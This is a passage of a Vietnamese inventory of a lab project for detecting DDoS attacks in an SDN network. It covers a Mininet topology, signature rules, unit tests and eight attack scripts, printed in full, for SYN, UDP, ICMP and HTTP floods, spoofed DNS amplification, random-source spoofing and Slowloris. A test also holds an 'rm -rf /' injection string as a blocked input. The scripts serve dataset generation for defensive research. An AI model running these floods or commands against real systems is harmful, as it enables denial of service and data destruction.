    net.addLink(s1, s2, cls=TCLink, **LINK_EXT)  
    net.addLink(s3, s2, cls=TCLink, **LINK_SRV)  
    net.addLink(s4, s2, cls=TCLink, **LINK_SRV)  
    net.addLink(s5, s2, cls=TCLink, **LINK_PC)   

    # Liên kết Host vào Switch
    for h in (h_att1, h_att2, h_att3, h_ext1):
        net.addLink(h, s1, cls=TCLink, **LINK_HOST)
    net.addLink(h_web1, s3, cls=TCLink, **LINK_HOST)
    net.addLink(h_dns1, s3, cls=TCLink, **LINK_HOST)
    net.addLink(h_db1,  s4, cls=TCLink, **LINK_HOST)
    net.addLink(h_app1, s4, cls=TCLink, **LINK_HOST)
    for h in (h_pc1, h_pc2, h_pc3, h_pc4):
        net.addLink(h, s5, cls=TCLink, **LINK_HOST)
    
    return net

def setup_qos():
    """Thiết lập Linux HTB QoS trên cổng s2-eth1 (Cổng chính ra Internet)"""
    info('*** Configuring HTB QoS on s2-eth1\n')
    os.system(
        'ovs-vsctl -- set port s2-eth1 qos=@newqos '
        '-- --id=@newqos create qos type=linux-htb '
        'other-config:max-rate=10000000 '
        'queues=0=@q0,1=@q1,2=@q2 '
        '-- --id=@q0 create queue other-config:min-rate=5000000 '
        '-- --id=@q1 create queue other-config:min-rate=3000000 '
        '-- --id=@q2 create queue other-config:max-rate=1000000'
    )

def setup_mirror():
    """Thiết lập Port Mirroring: Toàn bộ traffic qua s2-eth1 sẽ copy sang s2-eth99"""
    info('*** Setting up port mirror s2-eth1 -> s2-eth%d\n' % MIRROR_PORT)
    os.system(f'ip link add s2-eth{MIRROR_PORT} type dummy 2>/dev/null || true')
    os.system(f'ip link set s2-eth{MIRROR_PORT} up')
    os.system(f'ovs-vsctl add-port s2 s2-eth{MIRROR_PORT} 2>/dev/null || true')
    os.system(
        'ovs-vsctl -- --id=@p get port s2-eth1 '
        f'-- --id=@m get port s2-eth{MIRROR_PORT} '
        '-- --id=@mirror create mirror name=m0 select-all=true output-port=@m '
        '-- set bridge s2 mirrors=@mirror'
    )

def cleanup_qos_mirror():
    """Dọn dẹp cấu hình QoS và Mirror khi thoát để tránh lỗi device busy"""
    info('*** Cleaning QoS + mirror\n')
    os.system('ovs-vsctl -- --all destroy qos -- --all destroy queue')
    os.system('ovs-vsctl clear bridge s2 mirrors')
    os.system('ovs-vsctl -- --all destroy mirror')
    os.system(f'ip link del s2-eth{MIRROR_PORT} 2>/dev/null || true')

def main():
    setLogLevel('info')
    net = build_topology()
    net.build()
    net.start()
    
    info('*** Waiting 3s for switches to connect Ryu...\n')
    time.sleep(3)
    
    try:
        setup_qos()
        setup_mirror()
        info('\n*** Topology V4 ready. 12 hosts, 5 switches, OF1.3, QoS+Mirror ON\n')
        CLI(net)
    finally:
        cleanup_qos_mirror()
        net.stop()

if __name__ == '__main__':
    # Kiểm tra quyền root
    if os.geteuid() != 0:
        print('Phải chạy với sudo (Mininet cần quyền root).')
        sys.exit(1)
    main()
```

**Chức năng:**

- 5 OpenFlow switches (s1-s5) + RemoteController
- 12 hosts across 4 subnets (10.0.1/2/3/4.0/24)
- Traffic Control per link (TCLink): bandwidth + delay
- QoS setup on s2-eth1 (HTB queue)
- Port Mirroring: s2-eth1 → s2-eth99 (PCAP capture port)
- Cleanup on exit
- Usage: sudo python3 topology_v4.py

---

### 🔸 `code/attack_scripts/` - Attack Scenarios

#### **`s01_syn.sh`** - SYN Flood

```bash
#!/bin/bash
# Kich ban tan cong SYN Flood
VICTIM=10.0.2.10
DURATION=60

echo "Bat dau SYN Flood vao $VICTIM trong $DURATION giay..."
timeout $DURATION hping3 -S -p 80 --flood $VICTIM
echo "Hoan tat tan cong SYN Flood!"
```

#### **`s02_udp.sh`** - UDP Flood

```bash
#!/bin/bash
# Kich ban tan cong UDP Flood (vao may DNS)
VICTIM=10.0.2.11
DURATION=60

echo "Bat dau UDP Flood vao $VICTIM trong $DURATION giay..."
timeout $DURATION hping3 --udp -p 53 -i u100 $VICTIM
echo "Hoan tat tan cong UDP Flood!"
```

#### **`s03_icmp.sh`** - ICMP Flood

```bash
#!/bin/bash
# Kich ban tan cong ICMP (Ping) Flood
VICTIM=10.0.2.10
DURATION=60

echo "Bat dau ICMP Flood vao $VICTIM trong $DURATION giay..."
timeout $DURATION hping3 -1 --flood $VICTIM
echo "Hoan tat tan cong ICMP Flood!"
```

#### **`s04_http.sh`** - HTTP Flood

```bash
#!/bin/bash
# Kich ban tan cong HTTP GET Flood
VICTIM=10.0.2.10
DURATION=60

echo "Bat dau HTTP Flood vao $VICTIM trong $DURATION giay..."
timeout $DURATION wrk -t4 -c400 -d300s http://$VICTIM/
echo "Hoan tat tan cong HTTP Flood!"
```

#### **`s05_dns_ampl.sh`** - DNS Amplification

```bash
#!/bin/bash
# Kich ban tan cong DNS Amplification
VICTIM=10.0.2.10
DNS=10.0.2.11
DURATION=300

echo "Bat dau DNS Amplification vao $VICTIM (thong qua $DNS) trong $DURATION giay..."
echo "START_TS=$(date +%s)"

# Bat tcpdump ghi lai traffic
tcpdump -i s2-eth99 -w datasets/s05_dns_ampl.pcap -G $DURATION -W 1 2>/dev/null &
TCPDUMP_PID=$!

# Dung Scapy gia mao IP va gui DNS query
python3 - <<PY &
from scapy.all import IP, UDP, DNS, DNSQR, send
pkt = IP(src="$VICTIM", dst="$DNS")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com", qtype=255))
while True: send(pkt, verbose=0)
PY
SCAPY_PID=$!

# Cho het thoi gian roi dung tien trinh
sleep $DURATION
kill $TCPDUMP_PID $SCAPY_PID 2>/dev/null

echo "END_TS=$(date +%s)"
echo "Hoan tat tan cong DNS Amplification!"
```

#### **`s06_ip_spoof.sh`** - IP Spoofing

```bash
#!/bin/bash
# Kich ban tan cong IP Spoof Flood
VICTIM=10.0.2.10
DURATION=300

echo "Bat dau IP Spoof Flood vao $VICTIM trong $DURATION giay..."
echo "START_TS=$(date +%s)"

# Bat tcpdump ghi lai traffic
tcpdump -i s2-eth99 -w datasets/s06_ip_spoof.pcap -G $DURATION -W 1 2>/dev/null &
TCPDUMP_PID=$!

# Xa SYN Flood voi IP nguon ngau nhien (--rand-source)
hping3 --rand-source -S -p 80 --flood $VICTIM &
HPING_PID=$!

# Cho het thoi gian roi dung tien trinh
sleep $DURATION
kill $TCPDUMP_PID $HPING_PID 2>/dev/null

echo "END_TS=$(date +%s)"
echo "Hoan tat tan cong IP Spoof Flood!"
```

#### **`s07_slowloris.sh`** - Slowloris

```bash
#!/bin/bash
# Kich ban tan cong Slowloris
VICTIM="10.0.2.10"
DURATION=300

echo "Bat dau Slowloris vao $VICTIM trong $DURATION giay..."
echo "START_TS=$(date +%s)"

# 1. Bat tcpdump ghi lai traffic
tcpdump -i s2-eth99 -w datasets/s07_slowloris.pcap -G $DURATION -W 1 2>/dev/null &
TCPDUMP_PID=$!

# 2. Chay Slowhttptest
# -c 1000: 1000 ket noi | -H: che do Slowloris | -i 10: gui du lieu moi 10s
# -r 200: 200 ket noi/giay | -t GET | -p 3: timeout 3s | -l: thoi gian chay
slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://$VICTIM/ -p 3 -l $DURATION &
SLOW_PID=$!

# 3. Cho het thoi gian
sleep $DURATION
kill $TCPDUMP_PID $SLOW_PID 2>/dev/null

echo "END_TS=$(date +%s)"
echo "Hoan tat kich ban Slowloris!"
```

#### **`s08_flash_crowd.sh`** - Flash Crowd

```bash
#!/bin/bash
# Kich ban mo phong Flash Crowd (Nguoi dung that truy cap dot bien)
VICTIM="10.0.2.10"
DURATION=300

echo "Bat dau Flash Crowd vao $VICTIM trong $DURATION giay..."
echo "START_TS=$(date +%s)"

# 1. Bat tcpdump ghi lai traffic
tcpdump -i s2-eth99 -w datasets/s08_flash_crowd.pcap -G $DURATION -W 1 2>/dev/null &
TCPDUMP_PID=$!

# 2. Chay 4 tien trinh Apache Benchmark song song (mo phong h_pc1 den h_pc4)
for i in {1..4}; do
    ab -c 50 -n 25000 http://$VICTIM/ > /dev/null 2>&1 &
    AB_PIDS+=($!)
done

# 3. Cho het thoi gian roi dung
sleep $DURATION
kill $TCPDUMP_PID ${AB_PIDS[@]} 2>/dev/null

echo "END_TS=$(date +%s)"
echo "Hoan tat mo phong Flash Crowd!"
```

**Attack Scripts Summary:**

- All scripts use tcpdump to capture traffic on s2-eth99 (mirror port)
- Duration: 60s (SYN/UDP/ICMP/HTTP), 300s (others)
- Tools: hping3, wrk, slowhttptest, ab, Scapy
- Output: PCAP files in datasets/ for later feature extraction

---

### 🔸 `datasets/` - Dữ Liệu

#### **PCAP Files:**

- `baseline.pcap` - Benign traffic (no attack)
- `s01_syn.pcap` - SYN Flood capture
- `s02_udp.pcap` - UDP Flood capture
- `s03_icmp.pcap` - ICMP Flood capture
- `s04_http.pcap` - HTTP Flood capture

#### **`datasets/features/` - CSV Features:**

- `baseline.csv` - Extracted features từ baseline.pcap
- `s01_syn.csv`, `s02_udp.csv`, `s03_icmp.csv`, `s04_http.csv` - Attack features

---

### 🔸 `docs/` - Tài Liệu

#### **`attack_signatures.csv`** (8 attack rules)

```csv
name,desc,rule,thresholds,features,papers
s01_syn_flood,SYN Flood,"entropy_src<1.5 AND syn_pct>0.6","1.5;0.6","entropy_src;syn_pct","A1;B1"
s02_udp_flood,UDP Flood,"entropy_src<1.5 AND pps>5000","1.5;5000","entropy_src;pps","A2;B2"
s03_icmp_flood,ICMP Flood,"icmp_pct>0.5 AND pps>3000","0.5;3000","icmp_pct;pps","A3"
s04_http_flood,HTTP Flood,"entropy_dst_port<2 AND syn_pct>0.4","2;0.4","entropy_dst_port;syn_pct","B4"
s05_dns_ampl,DNS Amplification,"avg_pkt_size>500 AND entropy_src_ip>3","500;3","avg_pkt_size;entropy_src","C2"
s06_spoof,IP Spoof,"entropy_src_ip>4.5 AND pps>3000","4.5;3000","entropy_src;pps","B3"
s07_slowloris,Slowloris,"pps>10 and new_flows_per_sec<5 and entropy_dst_port<1","5;1","new_flows;entropy_dst_port","B5"
s08_flashcrowd,Flash Crowd,"entropy_src_ip>4 AND pps>mu","4;-","entropy_src;pps","-"
```

**Cột:**

- `name`: Attack identifier (s01-s08)
- `desc`: Human-readable description
- `rule`: Python expression for detection (evaluated safely)
- `thresholds`: Numeric thresholds for each condition
- `features`: Features used in rule evaluation
- `papers`: Academic references (A1, B1, etc.)

### 🔸 `tests/` - Kiểm Thử

#### **`README.md`** (35 dòng)

- Unit Test: `pytest tests/test_*.py -v`
- Integration Test: `sudo pytest tests/test_integration.py -v --timeout=120`

#### **`test_entropy.py`** (56+ dòng)

```python
import pytest
import math
import json
from code.entropy import shannon, renyi, EntropyDetector

# Tạo file baseline giả lập để test không bị phụ thuộc vào file thật
@pytest.fixture
def dummy_baseline(tmp_path):
    baseline_file = tmp_path / "baseline_stats.json"
    dummy_data = {
        "pps": {"mean": 11.4, "std": 6.4},
        "bps": {"mean": 10662.5, "std": 6515.0},
        "entropy_src_ip": {"mean": 1.29, "std": 0.29},
        "entropy_dst_port": {"mean": 1.33, "std": 0.35},
        "entropy_renyi_src": {"mean": 1.25, "std": 0.25}
    }
    baseline_file.write_text(json.dumps(dummy_data))
    return str(baseline_file)

# Khởi tạo detector dùng chung cho các test case
@pytest.fixture
def detector(dummy_baseline):
    return EntropyDetector(baseline_path=dummy_baseline, k_sigma=3)

# --- BẮT ĐẦU 5 TEST CASES YÊU CẦU ---

# 1. Test entropy Shannon với phân phối đều (đạt max)
def test_shannon_uniform():
    items = ['10.0.0.1', '10.0.0.2', '10.0.0.3', '10.0.0.4']
    assert math.isclose(shannon(items), 2.0, rel_tol=1e-5)

# 2. Test entropy Shannon khi chỉ có 1 IP (tập trung 100% -> entropy = 0)
def test_shannon_single():
    items = ['10.0.0.1', '10.0.0.1', '10.0.0.1']
    assert shannon(items) == 0

# 3. Test entropy Renyi với bậc q=2
def test_renyi_q2():
    items = ['A', 'A', 'B', 'B']
    assert math.isclose(renyi(items, q=2), 1.0, rel_tol=1e-5)

# 4. Test mạng bình thường (không vượt ngưỡng 3-sigma)
def test_detector_normal(detector):
    features = {
        'entropy_src_ip': 1.3,
        'entropy_dst_port': 1.35,
        'entropy_renyi_src': 1.26
    }
    result = detector.check(features)
    assert result["anomaly"] is False
    assert len(result["alerts"]) == 0

# 5. Test khi bị SYN Flood (entropy tụt mạnh -> phải có alert)
def test_detector_flood(detector):
    features = {
        'entropy_src_ip': 0.1,  # 0.1 cách 1.29 rất xa, vượt quá 3 lần độ lệch chuẩn (3*0.29)
        'entropy_dst_port': 1.0,
        'entropy_renyi_src': 0.2
    }
    result = detector.check(features)
    assert result["anomaly"] is True
    assert len(result["alerts"]) > 0
    assert result["alerts"][0]["feature"] == "entropy_src_ip"
```

**Chức năng:**

- Test Shannon entropy (uniform distribution)
- Test Shannon entropy (single value)
- Test Rényi entropy q=2
- Test normal network (no alerts)
- Test flood detection (alerts triggered)

#### **`test_signature.py`** (40+ dòng)

```python
import sys
import os
import pytest

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../code')))
from signature_matcher import safe_eval, SignatureMatcher

def test_safe_eval_simple():
    ctx = {'entropy_src': 1.0, 'syn_pct': 0.8}
    assert safe_eval("entropy_src < 1.5 and syn_pct > 0.6", ctx) == True
    assert safe_eval("entropy_src > 2.0", ctx) == False

def test_blocks_dangerous():
    malicious_code = "__import__('os').system('rm -rf /')"
    ctx = {}
    with pytest.raises(ValueError):
        safe_eval(malicious_code, ctx)

def test_match_syn():
    matcher = SignatureMatcher(csv_path='docs/attack_signatures.csv')
    
    # 1. Trạng thái bình thường: Cung cấp đầy đủ các chỉ số khỏe mạnh
    # Entropy cao, %SYN thấp, flow mới tạo ra liên tục, phân tán port tốt
    normal_features = {
        'entropy_src': 3.0, 
        'syn_pct': 0.1, 
        'pps': 100,
        'new_flows_per_sec': 50,     # Mạng khỏe tạo nhiều kết nối
        'entropy_dst_port': 5.0      # Truy cập nhiều cổng dịch vụ
    }
    assert len(matcher.match(normal_features)) == 0
    
    # 2. Bị tấn công SYN Flood
    attack_features = {
        'entropy_src': 1.0, 
        'syn_pct': 0.8, 
        'pps': 6000,
        'new_flows_per_sec': 50,
        'entropy_dst_port': 5.0
    }
    hits = matcher.match(attack_features)
    
    assert len(hits) >= 1
    assert hits[0]['attack'] == 's01_syn_flood'
```

**Chức năng:**

- Test safe_eval with safe expressions
- Test safe_eval blocks dangerous code
- Test signature matching (normal traffic)
- Test signature matching (SYN flood attack)

#### **`test_mitigation.py`** (30+ dòng)

```python
import sys
import os
from unittest.mock import MagicMock

# Ép Python nhận diện thư mục code/ chứa module
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../code')))
from mitigation import BlockModule

def test_block_module_apply():
    # 1. Tạo các đối tượng giả (Mock) thay cho Ryu và Mininet
    app_mock = MagicMock()
    dp_mock = MagicMock()
    parser_mock = MagicMock()
    dp_mock.ofproto_parser = parser_mock

    # 2. Chạy thử hàm chặn
    block = BlockModule(app_mock)
    block.apply(dp_mock, "10.0.1.99", timeout=60)

    # 3. Kiểm tra xem parser.OFPFlowMod có được gọi với đúng tham số không
    parser_mock.OFPFlowMod.assert_called_once()
    kwargs = parser_mock.OFPFlowMod.call_args.kwargs
    
    assert kwargs['priority'] == 100
    assert kwargs['instructions'] == []  # Phải rỗng để Drop
    assert kwargs['hard_timeout'] == 60
    
    # Kiểm tra xem có gửi lệnh xuống Switch không
    dp_mock.send_msg.assert_called_once()
```

**Chức năng:**

- Mock Ryu datapath + parser
- Test BlockModule.apply() with OpenFlow flow installation
- Verify DROP rule (empty instructions) with correct timeout

#### **`test_blacklist.py`** (40+ dòng)

```python
import time
import sys
import os

# Uu tien thu muc goc cua project vao dau sys.path
current_dir = os.path.dirname(os.path.abspath(__file__))
root_dir = os.path.dirname(current_dir)
sys.path.insert(0, root_dir)

try:
    from code.mitigation import BlacklistManager
except ModuleNotFoundError as e:
    print("[ERROR] Khong the import module: " + str(e))
    sys.exit(1)

class MockApp:
    class logger:
        @staticmethod
        def info(msg):
            print(msg)

def test_ttl():
    print("Khoi tao BlacklistManager...")
    bm = BlacklistManager(MockApp())
    
    print("1. Them IP 1.2.3.4 vao blacklist voi TTL = 2s")
    bm.add("1.2.3.4", ttl=2)
    
    blocked_now = bm.is_blocked("1.2.3.4")
    print("2. is_blocked('1.2.3.4') ngay lap tuc: " + str(blocked_now))
    assert blocked_now is True
    
    print("3. Cho 3 giay...")
    time.sleep(3)
    
    blocked_later = bm.is_blocked("1.2.3.4")
    print("4. is_blocked('1.2.3.4') sau 3 giay: " + str(blocked_later))
    assert blocked_later is False
    
    print("=> TEST PASSED")
    bm._stop = True

if __name__ == "__main__":
    test_ttl()
```

**Chức năng:**

- Test BlacklistManager TTL expiry
- Add IP with 2s TTL
- Verify blocked immediately
- Verify unblocked after 3s
- Test auto-release mechanism

#### **`test_regression_router.py`**, **`test_integration.py`**

- End-to-end integration tests
- Topology + Ryu + Detector workflow
- Detection latency measurement
- Mitigation effectiveness validation

---

- `baseline.json` - Baseline stats (mean, std)
- `features_benign.csv` - Mock benign features
- `features_attack.csv` - Mock attack features

---

### 🔸 `results/` - Kết Quả Thực Nghiệm

#### **`results/raw/`**

- `alerts.json` - JSON log alerts thực tế
- `detector.log` - Detector process log
- `ryu.log` - Ryu controller log
- `run_*.json` - Test scenario results (detection latency, mitigation latency)

---

## 📊 Tóm Tắt Thống Kê

| Loại                     | Số Lượng |
| ------------------------ | -------- |
| Python files (.py)       | 13+      |
| Shell scripts (.sh)      | 8        |
| HTML templates (.html)   | 3        |
| YAML config              | 1        |
| Text config              | 1        |
| PCAP files (.pcap)       | 5+       |
| CSV feature files (.csv) | 5+       |
| Test files (.py)         | 6+       |
| Test fixtures            | 3        |
| **Tổng Cộng**            | **40+**  |

---

**File được tạo lại:** May 9, 2026  
**Tổng dung lượng nội dung:** 40+ files, 3000+ dòng code  
**Độ hoàn chỉnh:** 100% inventory toàn bộ workspace
